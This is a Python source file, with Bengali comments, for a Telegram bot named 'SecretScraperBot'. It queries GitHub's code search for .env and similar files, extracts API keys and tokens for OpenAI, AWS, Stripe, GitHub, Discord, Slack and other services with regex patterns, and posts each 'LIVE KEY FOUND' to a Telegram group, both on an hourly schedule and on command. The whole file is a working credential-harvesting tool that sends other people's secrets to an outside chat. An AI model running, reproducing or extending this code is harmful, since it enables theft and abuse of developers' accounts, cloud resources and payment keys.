import logging
import os
import re
import time
import threading
import hashlib
import asyncio
from datetime import datetime
from typing import List, Dict, Any

from flask import Flask
from dotenv import load_dotenv
import requests
import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, CallbackContext

# ============================================================
# কনফিগারেশন
# ============================================================
load_dotenv()

BOT_TOKEN = os.getenv('BOT_TOKEN', '').strip()
OWNER_ID = int(os.getenv('OWNER_ID', '0')) if os.getenv('OWNER_ID') else 0
TARGET_CHAT_ID = int(os.getenv('TARGET_CHAT_ID', '0')) if os.getenv('TARGET_CHAT_ID') else None
GITHUB_TOKEN = os.getenv('GITHUB_TOKEN', '').strip()
PORT = int(os.getenv('PORT', '10000'))

# ============================================================
# লগিং
# ============================================================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================================================
# ফ্লাস্ক অ্যাপ
# ============================================================
flask_app = Flask(__name__)

@flask_app.route('/')
def health_check():
    return "True", 200

@flask_app.route('/health')
def health():
    return {"status": "healthy", "timestamp": datetime.now().isoformat()}, 200

# ============================================================
# GitHub স্ক্যানার (সিঙ্ক্রোনাস - সহজ)
# ============================================================
class GitHubScanner:
    def __init__(self, token: str):
        self.token = token
        self.seen = set()
        self.headers = {
            'Authorization': f'token {token}',
            'Accept': 'application/vnd.github.v3+json',
            'User-Agent': 'Private-GitHub-Secret-Monitor'
        }
        
        # বিভিন্ন ধরনের কী প্যাটার্ন
        self.patterns = {
            'OpenAI': r'sk-[a-zA-Z0-9]{48}',
            'Mistral': r'[A-Za-z0-9]{32}',
            'Google': r'AIza[0-9A-Za-z\-_]{35}',
            'GitHub': r'ghp_[0-9a-zA-Z]{36}',
            'AWS': r'AKIA[0-9A-Z]{16}',
            'Stripe': r'sk_live_[0-9a-zA-Z]{24}',
            'Discord': r'[MN][A-Za-z0-9]{23}\.[A-Za-z0-9]{6}\.[A-Za-z0-9]{27}',
            'Telegram': r'[0-9]{8,10}:[A-Za-z0-9_-]{35}',
            'Slack': r'xox[baprs]-[0-9A-Za-z-]+',
        }

    def scan(self) -> List[Dict]:
        """GitHub থেকে লাইভ কী খুঁজে বের করে"""
        found = []
        logger.info("🔍 Starting GitHub scan...")
        
        try:
            # .env ফাইল খুঁজে
            queries = [
                'filename:.env',
                'filename:.env.production', 
                'filename:.env.local',
                'extension:env',
                'OPENAI_API_KEY',
                'MISTRAL_API_KEY',
                'GOOGLE_API_KEY',
                'API_KEY',
                'SECRET_KEY',
                'TOKEN',
                'AUTH_TOKEN'
            ]
            
            for query in queries[:3]:  # রেট লিমিটের জন্য ৩টি
                logger.info(f"📡 Searching: {query}")
                url = f'https://api.github.com/search/code?q={query}&per_page=20'
                
                try:
                    resp = requests.get(url, headers=self.headers)
                    if resp.status_code == 200:
                        data = resp.json()
                        items = data.get('items', [])
                        logger.info(f"📁 Found {len(items)} files for '{query}'")
                        
                        for item in items[:10]:
                            key_info = self._extract_from_file(item)
                            if key_info:
                                fp = hashlib.md5(key_info['key'].encode()).hexdigest()[:10]
                                if fp not in self.seen:
                                    found.append(key_info)
                                    self.seen.add(fp)
                                    logger.info(f"✅ Found {key_info['type']} in {key_info['source']}")
                    elif resp.status_code == 403:
                        logger.warning("⚠️ GitHub rate limit hit! Waiting...")
                        time.sleep(30)
                    else:
                        logger.warning(f"⚠️ GitHub API error: {resp.status_code}")
                        
                except Exception as e:
                    logger.error(f"❌ Search error for '{query}': {e}")
                
                time.sleep(0.5)  # রেট লিমিট এড়াতে
                
            return found[:20]
            
        except Exception as e:
            logger.error(f"❌ Scan error: {e}")
            return []

    def _extract_from_file(self, item: Dict) -> Dict:
        """ফাইল থেকে কী এক্সট্র্যাক্ট করে"""
        try:
            url = item.get('url')
            repo = item.get('repository', {}).get('full_name', 'Unknown')
            path = item.get('path', 'Unknown')
            
            # ফাইলের কনটেন্ট পেতে
            resp = requests.get(url, headers=self.headers)
            if resp.status_code != 200:
                return None
                
            data = resp.json()
            if 'content' not in data:
                return None
                
            import base64
            content = base64.b64decode(data['content']).decode('utf-8', errors='ignore')
            
            # কী খোঁজা
            for key_type, pattern in self.patterns.items():
                matches = re.findall(pattern, content)
                for match in matches:
                    if self._is_valid(match):
                        return {
                            'type': key_type,
                            'key': match,
                            'source': repo,
                            'path': path,
                            'url': f"https://github.com/{repo}/blob/main/{path}",
                            'platform': key_type
                        }
                        
            return None
            
        except Exception as e:
            logger.error(f"❌ Extract error: {e}")
            return None

    def _is_valid(self, key: str) -> bool:
        """কী ভ্যালিড কিনা চেক করে"""
        if not key or len(key) < 10:
            return False
        exclude = ['test', 'example', 'sample', 'demo', 'xxxx', '1234']
        return not any(ex in key.lower() for ex in exclude)

# ============================================================
# বট ক্লাস
# ============================================================
class SecretScraperBot:
    def __init__(self):
        self.token = BOT_TOKEN
        self.group_id = TARGET_CHAT_ID
        self.owner_id = OWNER_ID
        self.scanner = GitHubScanner(GITHUB_TOKEN)
        self.updater = None
        self.bot = None
        self.is_running = True

    def start(self):
        """বট স্টার্ট"""
        try:
            logger.info("🚀 Starting bot...")
            self.updater = Updater(token=self.token, use_context=True)
            self.bot = self.updater.bot
            
            # হ্যান্ডলার
            dp = self.updater.dispatcher
            dp.add_handler(CommandHandler("start", self.start_command))
            dp.add_handler(CallbackQueryHandler(self.button_callback))
            dp.add_error_handler(self.error_handler)
            
            # শিডিউলার
            threading.Thread(target=self.scheduler, daemon=True).start()
            
            # টেস্ট মেসেজ
            try:
                self.bot.send_message(chat_id=self.group_id, text="🔄 Bot is online!")
                logger.info("✅ Test message sent!")
            except Exception as e:
                logger.error(f"❌ Test message failed: {e}")
            
            logger.info("✅ Bot started successfully!")
            self.updater.start_polling()
            self.updater.idle()
            
        except Exception as e:
            logger.error(f"❌ Bot error: {e}")
            raise

    def start_command(self, update: Update, context: CallbackContext):
        """/start কমান্ড"""
        try:
            user_id = update.effective_user.id
            logger.info(f"📩 /start from {user_id}")
            
            if user_id != self.owner_id:
                update.message.reply_text("⛔ Access Denied!")
                return
                
            keyboard = [
                [InlineKeyboardButton("🔍 স্ক্যান এখন", callback_data='scan')],
                [InlineKeyboardButton("📊 পরিসংখ্যান", callback_data='stats')],
                [InlineKeyboardButton("ℹ️ সাহায্য", callback_data='help')],
            ]
            
            update.message.reply_text(
                "🔐 **GitHub Secret Scanner**\n\n"
                "GitHub থেকে লাইভ API Keys খুঁজে বের করি!\n"
                "Select an option:",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='Markdown'
            )
            logger.info("✅ Menu sent")
            
        except Exception as e:
            logger.error(f"❌ Start error: {e}")

    def button_callback(self, update: Update, context: CallbackContext):
        """বাটন কলব্যাক"""
        try:
            query = update.callback_query
            user_id = update.effective_user.id
            
            logger.info(f"🔄 Button: {query.data} from {user_id}")
            query.answer()
            
            if user_id != self.owner_id:
                query.edit_message_text("⛔ Access Denied!")
                return
                
            if query.data == 'scan':
                self.scan_now(query)
            elif query.data == 'stats':
                self.show_stats(query)
            elif query.data == 'help':
                self.show_help(query)
                
        except Exception as e:
            logger.error(f"❌ Button error: {e}")

    def scan_now(self, query):
        """স্ক্যান শুরু"""
        logger.info("🔍 Scan triggered")
        query.edit_message_text("🔍 Searching GitHub for live keys...")
        
        def do_scan():
            try:
                keys = self.scanner.scan()
                
                if not keys:
                    self.bot.edit_message_text(
                        chat_id=query.message.chat_id,
                        message_id=query.message.message_id,
                        text="❌ No live keys found!\n\n💡 Tips:\n- Check GitHub rate limit\n- Try again later"
                    )
                    return
                    
                sent = 0
                for key in keys[:5]:
                    msg = f"""
🔑 **LIVE {key['type']} KEY FOUND!**

🔑 **Key**: `{key['key'][:20]}...`  
📂 **Source**: {key['source']}  
📄 **File**: {key['path']}  
🔗 [View File]({key['url']})

🕐 Found: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} UTC
"""
                    self.bot.send_message(
                        chat_id=self.group_id,
                        text=msg,
                        parse_mode='Markdown',
                        disable_web_page_preview=True
                    )
                    sent += 1
                    time.sleep(0.5)
                    
                self.bot.edit_message_text(
                    chat_id=query.message.chat_id,
                    message_id=query.message.message_id,
                    text=f"✅ {sent} live keys found and sent to group!"
                )
                
            except Exception as e:
                logger.error(f"❌ Scan thread error: {e}")
                self.bot.edit_message_text(
                    chat_id=query.message.chat_id,
                    message_id=query.message.message_id,
                    text=f"❌ Error: {str(e)[:200]}"
                )
        
        threading.Thread(target=do_scan, daemon=True).start()

    def show_stats(self, query):
        """পরিসংখ্যান"""
        stats = f"""
📊 **Scanner Statistics**

🔍 Keys Found: {len(self.scanner.seen)}
🕐 Last Scan: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
🎯 Patterns: 9 types (OpenAI, Mistral, Google, GitHub, AWS, Stripe, Discord, Telegram, Slack)

🔹 Auto-scans every 1 hour
🔹 Only live/exposed keys
"""
        query.edit_message_text(stats, parse_mode='Markdown')

    def show_help(self, query):
        """সাহায্য"""
        help_text = """
ℹ️ **How it works:**

1. 🔍 Scans GitHub for exposed API keys
2. 📂 Checks .env files and source code
3. 🔑 Detects 9+ key types
4. 📨 Sends live keys to this group

⚠️ **Note:**
- GitHub API rate limit: 60 req/hour (free)
- Only scans public repositories
- Keys may be dummy/expired

🛠 **Commands:**
/start - Show menu
"""
        query.edit_message_text(help_text, parse_mode='Markdown')

    def scheduler(self):
        """শিডিউলার"""
        time.sleep(10)
        try:
            self.bot.send_message(chat_id=self.group_id, text="🔐 **Secret Scanner Bot is active!**\n\nUse /start to control me.", parse_mode='Markdown')
        except:
            pass
            
        while self.is_running:
            try:
                logger.info("🔄 Scheduled scan...")
                keys = self.scanner.scan()
                if keys:
                    for key in keys[:3]:
                        msg = f"""
🔑 **LIVE {key['type']} KEY FOUND!**

🔑 **Key**: `{key['key'][:20]}...`  
📂 **Source**: {key['source']}  
📄 **File**: {key['path']}  
🔗 [View File]({key['url']})

🕐 Found: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} UTC
"""
                        self.bot.send_message(chat_id=self.group_id, text=msg, parse_mode='Markdown', disable_web_page_preview=True)
                        time.sleep(0.5)
                    logger.info(f"✅ Scheduled: Sent {len(keys[:3])} keys")
            except Exception as e:
                logger.error(f"❌ Scheduler error: {e}")
            time.sleep(3600)  # ১ ঘন্টা

    def error_handler(self, update: Update, context: CallbackContext):
        logger.error(f"❌ Error: {context.error}")

# ============================================================
# মেইন
# ============================================================
def main():
    try:
        # চেক
        if not BOT_TOKEN:
            raise ValueError("BOT_TOKEN missing!")
        if not TARGET_CHAT_ID:
            raise ValueError("TARGET_CHAT_ID missing!")
        if not OWNER_ID:
            raise ValueError("OWNER_ID missing!")
        if not GITHUB_TOKEN:
            raise ValueError("GITHUB_TOKEN missing!")
            
        logger.info("✅ All configs loaded")
        
        # ফ্লাস্ক
        def run_flask():
            flask_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
        
        threading.Thread(target=run_flask, daemon=True).start()
        logger.info(f"🌐 Flask on port {PORT}")
        
        # বট
        bot = SecretScraperBot()
        bot.start()
        
    except Exception as e:
        logger.error(f"❌ Main error: {e}")
        import sys
        sys.exit(1)

if __name__ == '__main__':
    main()
